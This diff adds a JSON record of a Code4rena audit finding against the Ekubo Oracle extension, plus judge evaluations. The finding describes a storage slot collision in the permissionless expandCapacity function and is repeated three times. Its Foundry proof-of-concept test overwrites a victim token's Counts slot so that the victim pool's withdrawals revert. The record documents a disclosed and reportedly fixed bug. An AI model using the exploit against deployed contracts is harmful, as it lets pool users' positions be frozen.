@@ -1,0 +1,130 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Ekubo_3FTodhsvBkM",
+    "audit_uid": "3FTodhsvBkM",
+    "requested_submission_uid": "2VpY9ZKEXeo",
+    "requested_finding_uid": "TuLiGdJaxpt",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Ekubo_3FTodhsvBkM/20260618_144948/findings.json",
+    "source_submission_uid": "2VpY9ZKEXeo",
+    "source_finding_uid": "TuLiGdJaxpt",
+    "original_report_path": "Ekubo_3FTodhsvBkM\\medium_valid_2VpY9ZKEXeo.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "2VpY9ZKEXeo",
+  "finding_uid": "TuLiGdJaxpt",
+  "finding_number": "21",
+  "title": "Oracle storage slot collision allows DoS of any oracle pool via `expandCapacity`",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xauditagent",
+  "body": "### Description\n\nThe Oracle extension in `src/extensions/Oracle.sol` maintains two distinct data structures in storage:\n- [Counts](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/counts.sol)\n- [Snapshot](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/snapshot.sol)\n\nBoth counters and snapshots are written into the same 256-bit storage key space. For a given token, `Counts[tokenA]` lives at the slot `V = uint256(uint160(tokenA))`\n\nSnapshots are stored at slots of the form `S = (uint256(uint160(tokenB)) << 32) | i`\n\nBecause both patterns share the same namespace, it’s always possible to pick some (tokenB, i) such that `S == V`, meaning a snapshot write can overwrite another token’s Counts entry.\n\nIt is easy to calculate the collision token, here is an example in solidity:\n\n```solidity\n\nfunction getCollision(address tokenA) pure returns (address tokenB, uint32 i) {\n    uint256 v = uint256(uint160(tokenA));\n    tokenB = address(uint160(v >> 32));\n    i = uint32(v);\n}\n```\n\nCounts storage:\n```solidity\n\nfunction expandCapacity(address token, uint32 minCapacity) external returns (uint32 capacity) {\n    Counts c;\n    assembly (\"memory-safe\") {\n        c := sload(token) // @audit: Reads from slot = uint256(uint160(token))\n    }\n\n    if (c.capacity() < minCapacity) {\n        for (uint256 i = c.capacity(); i < minCapacity; i++) {\n            assembly (\"memory-safe\") {\n                // Simply initialize the slot, it will be overwritten when the index is reached\n                sstore(or(shl(32, token), i), 1) // @audit: Writes literal `1` to slot = (token << 32) | i\n            }\n        }\n        c = createCounts({\n            _index: c.index(), _count: c.count(), _capacity: minCapacity, _lastTimestamp: c.lastTimestamp()\n        });\n        assembly (\"memory-safe\") {\n            sstore(token, c) // @audit: Writes to slot = uint256(uint160(token))\n        }\n    }\n\n    capacity = c.capacity();\n}\n```\n\nSnapshot storage:\n\n```solidity\n\nassembly (\"memory-safe\") {\n    last := sload(or(shl(32, token), index))  // @audit: Reads from slot = (token << 32) | index\n}\n// ...\nassembly (\"memory-safe\") {\n    sstore(or(shl(32, token), index), snapshot)  // @audit Writes to slot = (token << 32) | index\n}\n```\n\n\nThe `expandCapacity` function is fully permissionless. It has no access control, does not validate that the token is a real ERC20, and does not check whether an oracle pool exists for the token.\n\nWhen the attacker calls `oracle.expandCapacity(tokenB, i + 1)`:\n- The loop iterates from 0 to i (since `tokenB` has no prior capacity)\n- At iteration i, it executes `sstore((tokenB << 32) | i, 1)`\n- This is equivalent to `sstore(tokenA, 1)`, overwriting `Counts[tokenA]`\n\n### Impact\n\nOn any subsequent pool operation (swap, deposit, withdraw) that triggers `maybeInsertSnapshot`, the following code executes:\n\n```solidity\n\nfunction maybeInsertSnapshot(PoolId poolId, address token) private {\n    unchecked {\n        Counts c;\n        assembly (\"memory-safe\") {\n            c := sload(token)  // @audit: Loads corrupted value: count = 0\n        }\n\n        uint32 timePassed = uint32(block.timestamp) - c.lastTimestamp();\n        if (timePassed == 0) return;  // Does NOT return since lastTimestamp = 0\n\n        // ...\n        uint32 count = c.count();  // count = 0\n        // ...\n        index = (index + 1) % count;  // @audit: Reverts `(index + 1) % 0`\n    }\n}\n```",
+  "proof_of_concept": "Add this test to `test/extensions/OracleStorageCollision.t.sol`. Following the following test through:\n\n```bash\n\nforge test --match-test test_oracle_storage_collision\n```\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.30;\n\nimport {PoolKey} from \"../../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../../src/types/poolConfig.sol\";\nimport {MIN_TICK, MAX_TICK, NATIVE_TOKEN_ADDRESS} from \"../../src/math/constants.sol\";\nimport {FullTest} from \"../FullTest.sol\";\nimport {oracleCallPoints} from \"../../src/extensions/Oracle.sol\";\nimport {IOracle} from \"../../src/interfaces/extensions/IOracle.sol\";\nimport {CoreLib} from \"../../src/libraries/CoreLib.sol\";\nimport {OracleLib} from \"../../src/libraries/OracleLib.sol\";\nimport {Counts} from \"../../src/types/counts.sol\";\nimport {TestToken} from \"../TestToken.sol\";\nimport {stdError} from \"forge-std/Test.sol\";\n\ncontract OracleStorageCollisionPoC is FullTest {\n    using CoreLib for *;\n    using OracleLib for *;\n\n    IOracle internal oracle;\n    address internal victimToken;\n\n    function setUp() public override {\n        FullTest.setUp();\n        uint256 victimWord = (uint256(0x1234) << 32) | uint256(5);\n        victimToken = address(uint160(victimWord));\n        deployCodeTo(\"TestToken.sol\", abi.encode(address(this)), victimToken);\n\n        address deployAddress = address(uint160(oracleCallPoints().toUint8()) << 152);\n        deployCodeTo(\"Oracle.sol\", abi.encode(core), deployAddress);\n        oracle = IOracle(deployAddress);\n    }\n\n    function createOraclePool(address quoteToken, int32 tick) internal returns (PoolKey memory poolKey) {\n        poolKey = createPool(NATIVE_TOKEN_ADDRESS, quoteToken, tick, createFullRangePoolConfig(0, address(oracle)));\n    }\n\n    function _addLiquidity(PoolKey memory poolKey) internal returns (uint256 id, uint128 liquidity) {\n        TestToken(poolKey.token1).approve(address(positions), type(uint256).max);\n        (id, liquidity) = createPosition(poolKey, MIN_TICK, MAX_TICK, 1_000 ether, 2_000 ether);\n        assertGt(liquidity, 0, \"no liquidity minted\");\n    }\n\n    function test_oracle_storage_collision() public {\n\n        uint256 startTime = 1_000_000;\n        vm.warp(startTime);\n\n        PoolKey memory poolKey = createOraclePool(victimToken, 693_147);\n        (uint256 victimPositionId, uint128 liquidity) = _addLiquidity(poolKey);\n\n        advanceTime(30);\n\n        // @audit: Attacker computes colliding attacker token and index\n        uint256 slotA = uint256(uint160(victimToken));\n        address attackerToken = address(uint160(slotA >> 32));\n        uint32 i = uint32(slotA - (uint256(uint160(attackerToken)) << 32));\n\n        // Attacker corrupts Counts[victimToken] via expandCapacity(attackerToken)\n        uint32 attackerCapacity = oracle.expandCapacity(attackerToken, i + 1);\n        assertGe(attackerCapacity, i + 1, \"attacker capacity should be expanded\");\n\n        // @audit: Counts[victimToken] has been overwritten\n        Counts afterCounts = oracle.counts(victimToken);\n        assertEq(afterCounts.count(), 0, \"corrupted count should be 0\");\n\n        vm.warp(startTime + 60);\n\n        // @audit: Any liquidity changing operation for the victim pool will now revert\n        vm.expectRevert(stdError.divisionError);\n        positions.withdraw(victimPositionId, poolKey, MIN_TICK, MAX_TICK, liquidity);\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L212-L235",
+    "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L91-L146"
+  ],
+  "source_record": {
+    "project_id": "3FTodhsvBkM",
+    "submission_index": "889",
+    "api_submission_id": "",
+    "uid": "2VpY9ZKEXeo",
+    "number": "889",
+    "title": "Oracle storage slot collision allows DoS of any oracle pool via `expandCapacity`",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xauditagent",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L212-L235",
+      "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L91-L146"
+    ],
+    "body": "### Description\n\nThe Oracle extension in `src/extensions/Oracle.sol` maintains two distinct data structures in storage:\n- [Counts](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/counts.sol)\n- [Snapshot](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/snapshot.sol)\n\nBoth counters and snapshots are written into the same 256-bit storage key space. For a given token, `Counts[tokenA]` lives at the slot `V = uint256(uint160(tokenA))`\n\nSnapshots are stored at slots of the form `S = (uint256(uint160(tokenB)) << 32) | i`\n\nBecause both patterns share the same namespace, it’s always possible to pick some (tokenB, i) such that `S == V`, meaning a snapshot write can overwrite another token’s Counts entry.\n\nIt is easy to calculate the collision token, here is an example in solidity:\n\n```solidity\n\nfunction getCollision(address tokenA) pure returns (address tokenB, uint32 i) {\n    uint256 v = uint256(uint160(tokenA));\n    tokenB = address(uint160(v >> 32));\n    i = uint32(v);\n}\n```\n\nCounts storage:\n```solidity\n\nfunction expandCapacity(address token, uint32 minCapacity) external returns (uint32 capacity) {\n    Counts c;\n    assembly (\"memory-safe\") {\n        c := sload(token) // @audit: Reads from slot = uint256(uint160(token))\n    }\n\n    if (c.capacity() < minCapacity) {\n        for (uint256 i = c.capacity(); i < minCapacity; i++) {\n            assembly (\"memory-safe\") {\n                // Simply initialize the slot, it will be overwritten when the index is reached\n                sstore(or(shl(32, token), i), 1) // @audit: Writes literal `1` to slot = (token << 32) | i\n            }\n        }\n        c = createCounts({\n            _index: c.index(), _count: c.count(), _capacity: minCapacity, _lastTimestamp: c.lastTimestamp()\n        });\n        assembly (\"memory-safe\") {\n            sstore(token, c) // @audit: Writes to slot = uint256(uint160(token))\n        }\n    }\n\n    capacity = c.capacity();\n}\n```\n\nSnapshot storage:\n\n```solidity\n\nassembly (\"memory-safe\") {\n    last := sload(or(shl(32, token), index))  // @audit: Reads from slot = (token << 32) | index\n}\n// ...\nassembly (\"memory-safe\") {\n    sstore(or(shl(32, token), index), snapshot)  // @audit Writes to slot = (token << 32) | index\n}\n```\n\n\nThe `expandCapacity` function is fully permissionless. It has no access control, does not validate that the token is a real ERC20, and does not check whether an oracle pool exists for the token.\n\nWhen the attacker calls `oracle.expandCapacity(tokenB, i + 1)`:\n- The loop iterates from 0 to i (since `tokenB` has no prior capacity)\n- At iteration i, it executes `sstore((tokenB << 32) | i, 1)`\n- This is equivalent to `sstore(tokenA, 1)`, overwriting `Counts[tokenA]`\n\n### Impact\n\nOn any subsequent pool operation (swap, deposit, withdraw) that triggers `maybeInsertSnapshot`, the following code executes:\n\n```solidity\n\nfunction maybeInsertSnapshot(PoolId poolId, address token) private {\n    unchecked {\n        Counts c;\n        assembly (\"memory-safe\") {\n            c := sload(token)  // @audit: Loads corrupted value: count = 0\n        }\n\n        uint32 timePassed = uint32(block.timestamp) - c.lastTimestamp();\n        if (timePassed == 0) return;  // Does NOT return since lastTimestamp = 0\n\n        // ...\n        uint32 count = c.count();  // count = 0\n        // ...\n        index = (index + 1) % count;  // @audit: Reverts `(index + 1) % 0`\n    }\n}\n```",
+    "proof_of_concept": "Add this test to `test/extensions/OracleStorageCollision.t.sol`. Following the following test through:\n\n```bash\n\nforge test --match-test test_oracle_storage_collision\n```\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.30;\n\nimport {PoolKey} from \"../../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../../src/types/poolConfig.sol\";\nimport {MIN_TICK, MAX_TICK, NATIVE_TOKEN_ADDRESS} from \"../../src/math/constants.sol\";\nimport {FullTest} from \"../FullTest.sol\";\nimport {oracleCallPoints} from \"../../src/extensions/Oracle.sol\";\nimport {IOracle} from \"../../src/interfaces/extensions/IOracle.sol\";\nimport {CoreLib} from \"../../src/libraries/CoreLib.sol\";\nimport {OracleLib} from \"../../src/libraries/OracleLib.sol\";\nimport {Counts} from \"../../src/types/counts.sol\";\nimport {TestToken} from \"../TestToken.sol\";\nimport {stdError} from \"forge-std/Test.sol\";\n\ncontract OracleStorageCollisionPoC is FullTest {\n    using CoreLib for *;\n    using OracleLib for *;\n\n    IOracle internal oracle;\n    address internal victimToken;\n\n    function setUp() public override {\n        FullTest.setUp();\n        uint256 victimWord = (uint256(0x1234) << 32) | uint256(5);\n        victimToken = address(uint160(victimWord));\n        deployCodeTo(\"TestToken.sol\", abi.encode(address(this)), victimToken);\n\n        address deployAddress = address(uint160(oracleCallPoints().toUint8()) << 152);\n        deployCodeTo(\"Oracle.sol\", abi.encode(core), deployAddress);\n        oracle = IOracle(deployAddress);\n    }\n\n    function createOraclePool(address quoteToken, int32 tick) internal returns (PoolKey memory poolKey) {\n        poolKey = createPool(NATIVE_TOKEN_ADDRESS, quoteToken, tick, createFullRangePoolConfig(0, address(oracle)));\n    }\n\n    function _addLiquidity(PoolKey memory poolKey) internal returns (uint256 id, uint128 liquidity) {\n        TestToken(poolKey.token1).approve(address(positions), type(uint256).max);\n        (id, liquidity) = createPosition(poolKey, MIN_TICK, MAX_TICK, 1_000 ether, 2_000 ether);\n        assertGt(liquidity, 0, \"no liquidity minted\");\n    }\n\n    function test_oracle_storage_collision() public {\n\n        uint256 startTime = 1_000_000;\n        vm.warp(startTime);\n\n        PoolKey memory poolKey = createOraclePool(victimToken, 693_147);\n        (uint256 victimPositionId, uint128 liquidity) = _addLiquidity(poolKey);\n\n        advanceTime(30);\n\n        // @audit: Attacker computes colliding attacker token and index\n        uint256 slotA = uint256(uint160(victimToken));\n        address attackerToken = address(uint160(slotA >> 32));\n        uint32 i = uint32(slotA - (uint256(uint160(attackerToken)) << 32));\n\n        // Attacker corrupts Counts[victimToken] via expandCapacity(attackerToken)\n        uint32 attackerCapacity = oracle.expandCapacity(attackerToken, i + 1);\n        assertGe(attackerCapacity, i + 1, \"attacker capacity should be expanded\");\n\n        // @audit: Counts[victimToken] has been overwritten\n        Counts afterCounts = oracle.counts(victimToken);\n        assertEq(afterCounts.count(), 0, \"corrupted count should be 0\");\n\n        vm.warp(startTime + 60);\n\n        // @audit: Any liquidity changing operation for the victim pool will now revert\n        vm.expectRevert(stdError.divisionError);\n        positions.withdraw(victimPositionId, poolKey, MIN_TICK, MAX_TICK, liquidity);\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/3FTodhsvBkM/submissions/889",
+    "raw": {
+      "auditUid": "3FTodhsvBkM",
+      "createdAt": "2025-12-10T11:09:25.595Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "mPRFTA2qCXS",
+          "userUid": "nj8chUpsBrG",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-08T10:56:57.535Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "TuLiGdJaxpt"
+        },
+        {
+          "uid": "nMomgsigKb9",
+          "userUid": "nj8chUpsBrG",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-26T14:00:28.778Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "2VpY9ZKEXeo",
+          "findingUid": null
+        },
+        {
+          "uid": "vAubXgGGT9y",
+          "userUid": "RHjALPGJ5G9",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-12-28T17:22:34.104Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "TuLiGdJaxpt"
+        },
+        {
+          "uid": "8XAG2Ej8Z3X",
+          "userUid": "drRH4fuyY4X",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-22T23:54:46.271Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "TuLiGdJaxpt"
+        }
+      ],
+      "finding": {
+        "uid": "TuLiGdJaxpt",
+        "number": 21,
+        "duplicates": 8
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "medium",
+        "validity": "valid",
+        "updatedAt": "2026-01-22T23:54:46.271Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Oracle storage slot collision allows DoS of any oracle pool via `expandCapacity`",
+      "uid": "2VpY9ZKEXeo",
+      "updatedAt": "2025-12-10T11:19:15.914Z",
+      "user": {
+        "uid": "Tk7xX5b4ZZW",
+        "handle": "0xauditagent"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "### Description\n\nThe Oracle extension in `src/extensions/Oracle.sol` maintains two distinct data structures in storage:\n- [Counts](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/counts.sol)\n- [Snapshot](https://github.com/code-423n4/2025-11-ekubo/blob/main/src/types/snapshot.sol)\n\nBoth counters and snapshots are written into the same 256-bit storage key space. For a given token, `Counts[tokenA]` lives at the slot `V = uint256(uint160(tokenA))`\n\nSnapshots are stored at slots of the form `S = (uint256(uint160(tokenB)) << 32) | i`\n\nBecause both patterns share the same namespace, it’s always possible to pick some (tokenB, i) such that `S == V`, meaning a snapshot write can overwrite another token’s Counts entry.\n\nIt is easy to calculate the collision token, here is an example in solidity:\n\n```solidity\n\nfunction getCollision(address tokenA) pure returns (address tokenB, uint32 i) {\n    uint256 v = uint256(uint160(tokenA));\n    tokenB = address(uint160(v >> 32));\n    i = uint32(v);\n}\n```\n\nCounts storage:\n```solidity\n\nfunction expandCapacity(address token, uint32 minCapacity) external returns (uint32 capacity) {\n    Counts c;\n    assembly (\"memory-safe\") {\n        c := sload(token) // @audit: Reads from slot = uint256(uint160(token))\n    }\n\n    if (c.capacity() < minCapacity) {\n        for (uint256 i = c.capacity(); i < minCapacity; i++) {\n            assembly (\"memory-safe\") {\n                // Simply initialize the slot, it will be overwritten when the index is reached\n                sstore(or(shl(32, token), i), 1) // @audit: Writes literal `1` to slot = (token << 32) | i\n            }\n        }\n        c = createCounts({\n            _index: c.index(), _count: c.count(), _capacity: minCapacity, _lastTimestamp: c.lastTimestamp()\n        });\n        assembly (\"memory-safe\") {\n            sstore(token, c) // @audit: Writes to slot = uint256(uint160(token))\n        }\n    }\n\n    capacity = c.capacity();\n}\n```\n\nSnapshot storage:\n\n```solidity\n\nassembly (\"memory-safe\") {\n    last := sload(or(shl(32, token), index))  // @audit: Reads from slot = (token << 32) | index\n}\n// ...\nassembly (\"memory-safe\") {\n    sstore(or(shl(32, token), index), snapshot)  // @audit Writes to slot = (token << 32) | index\n}\n```\n\n\nThe `expandCapacity` function is fully permissionless. It has no access control, does not validate that the token is a real ERC20, and does not check whether an oracle pool exists for the token.\n\nWhen the attacker calls `oracle.expandCapacity(tokenB, i + 1)`:\n- The loop iterates from 0 to i (since `tokenB` has no prior capacity)\n- At iteration i, it executes `sstore((tokenB << 32) | i, 1)`\n- This is equivalent to `sstore(tokenA, 1)`, overwriting `Counts[tokenA]`\n\n### Impact\n\nOn any subsequent pool operation (swap, deposit, withdraw) that triggers `maybeInsertSnapshot`, the following code executes:\n\n```solidity\n\nfunction maybeInsertSnapshot(PoolId poolId, address token) private {\n    unchecked {\n        Counts c;\n        assembly (\"memory-safe\") {\n            c := sload(token)  // @audit: Loads corrupted value: count = 0\n        }\n\n        uint32 timePassed = uint32(block.timestamp) - c.lastTimestamp();\n        if (timePassed == 0) return;  // Does NOT return since lastTimestamp = 0\n\n        // ...\n        uint32 count = c.count();  // count = 0\n        // ...\n        index = (index + 1) % count;  // @audit: Reverts `(index + 1) % 0`\n    }\n}\n```",
+      "proofOfConcept": "Add this test to `test/extensions/OracleStorageCollision.t.sol`. Following the following test through:\n\n```bash\n\nforge test --match-test test_oracle_storage_collision\n```\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.30;\n\nimport {PoolKey} from \"../../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../../src/types/poolConfig.sol\";\nimport {MIN_TICK, MAX_TICK, NATIVE_TOKEN_ADDRESS} from \"../../src/math/constants.sol\";\nimport {FullTest} from \"../FullTest.sol\";\nimport {oracleCallPoints} from \"../../src/extensions/Oracle.sol\";\nimport {IOracle} from \"../../src/interfaces/extensions/IOracle.sol\";\nimport {CoreLib} from \"../../src/libraries/CoreLib.sol\";\nimport {OracleLib} from \"../../src/libraries/OracleLib.sol\";\nimport {Counts} from \"../../src/types/counts.sol\";\nimport {TestToken} from \"../TestToken.sol\";\nimport {stdError} from \"forge-std/Test.sol\";\n\ncontract OracleStorageCollisionPoC is FullTest {\n    using CoreLib for *;\n    using OracleLib for *;\n\n    IOracle internal oracle;\n    address internal victimToken;\n\n    function setUp() public override {\n        FullTest.setUp();\n        uint256 victimWord = (uint256(0x1234) << 32) | uint256(5);\n        victimToken = address(uint160(victimWord));\n        deployCodeTo(\"TestToken.sol\", abi.encode(address(this)), victimToken);\n\n        address deployAddress = address(uint160(oracleCallPoints().toUint8()) << 152);\n        deployCodeTo(\"Oracle.sol\", abi.encode(core), deployAddress);\n        oracle = IOracle(deployAddress);\n    }\n\n    function createOraclePool(address quoteToken, int32 tick) internal returns (PoolKey memory poolKey) {\n        poolKey = createPool(NATIVE_TOKEN_ADDRESS, quoteToken, tick, createFullRangePoolConfig(0, address(oracle)));\n    }\n\n    function _addLiquidity(PoolKey memory poolKey) internal returns (uint256 id, uint128 liquidity) {\n        TestToken(poolKey.token1).approve(address(positions), type(uint256).max);\n        (id, liquidity) = createPosition(poolKey, MIN_TICK, MAX_TICK, 1_000 ether, 2_000 ether);\n        assertGt(liquidity, 0, \"no liquidity minted\");\n    }\n\n    function test_oracle_storage_collision() public {\n\n        uint256 startTime = 1_000_000;\n        vm.warp(startTime);\n\n        PoolKey memory poolKey = createOraclePool(victimToken, 693_147);\n        (uint256 victimPositionId, uint128 liquidity) = _addLiquidity(poolKey);\n\n        advanceTime(30);\n\n        // @audit: Attacker computes colliding attacker token and index\n        uint256 slotA = uint256(uint160(victimToken));\n        address attackerToken = address(uint160(slotA >> 32));\n        uint32 i = uint32(slotA - (uint256(uint160(attackerToken)) << 32));\n\n        // Attacker corrupts Counts[victimToken] via expandCapacity(attackerToken)\n        uint32 attackerCapacity = oracle.expandCapacity(attackerToken, i + 1);\n        assertGe(attackerCapacity, i + 1, \"attacker capacity should be expanded\");\n\n        // @audit: Counts[victimToken] has been overwritten\n        Counts afterCounts = oracle.counts(victimToken);\n        assertEq(afterCounts.count(), 0, \"corrupted count should be 0\");\n\n        vm.warp(startTime + 60);\n\n        // @audit: Any liquidity changing operation for the victim pool will now revert\n        vm.expectRevert(stdError.divisionError);\n        positions.withdraw(victimPositionId, poolKey, MIN_TICK, MAX_TICK, liquidity);\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L212-L235,https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol#L91-L146",
+      "number": 889,
+      "aiExplanation": null,
+      "_index": 889
+    }
+  }
+}
